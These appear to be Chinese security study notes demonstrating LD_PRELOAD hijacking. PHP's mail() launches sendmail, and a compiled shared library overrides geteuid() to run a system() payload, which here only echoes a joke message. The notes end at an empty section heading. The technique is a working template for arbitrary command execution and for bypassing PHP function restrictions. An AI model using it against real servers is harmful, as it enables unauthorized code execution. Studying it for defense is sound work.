常用函数

mail--php内置

imagick--扩展安装

# 修改函数原理复现

准备php文件

```php
<?php                                                                                                                                                
mail('','','','');                                                                                                                                                                
?>     
```

就是一个简单的发送邮件的函数

（现在需要安装sendmail）`apt install sendmail`

```bash
strace -o 1.txt -f php 1.php  //将1.php的执行过程写入1.txt

//strace命令需要下载---->apt install strace
```

![800](assets/LD_PRELOAD劫持/file-20251216125107818.png)

我们这里过滤了一下exec，看到明显调用了sendmail模块

```bash
readelf -Ws /usr/sbin/sendmail  //查看sendmail函数调用了什么库，
```

![](assets/LD_PRELOAD劫持/file-20251216125123601.png)

为了方便就不一个个找了。有一个geteuid函数。

我们目标就是伪造一个动态链接库。

这个库里面相当于重写了geteuid函数

**这样使用mail函数时，会调用sendmail，sendmail会调用重写的geteuid函数**

（这里用c语言写，并且编译成so文件）

```c
#include<stdio.h>                                                                                                                                                                 
#include<stdlib.h>                                                                                                                                                      
#include<string.h>                                                                                                                                                              
void payload(){                                                                                                                                                                   
        system("echo '小可爱，你邮件还发的出去吗？'");                                                                                                                            
}                                                                                                                                                                                 
int geteuid(){                                                                                                                                                                    
        unsetenv("LD_PRELOAD");                                                                                                                                                   
        payload();                                                                                                                                                                
}           
```

```bash
gcc -shared -fPIC demo.c -o demo.so
```

此时在1.php中加上调用我们动态链接库的语句后再执行。

![600](assets/LD_PRELOAD劫持/file-20251216125210042.png)
成功被我们修改。

# 自动执行
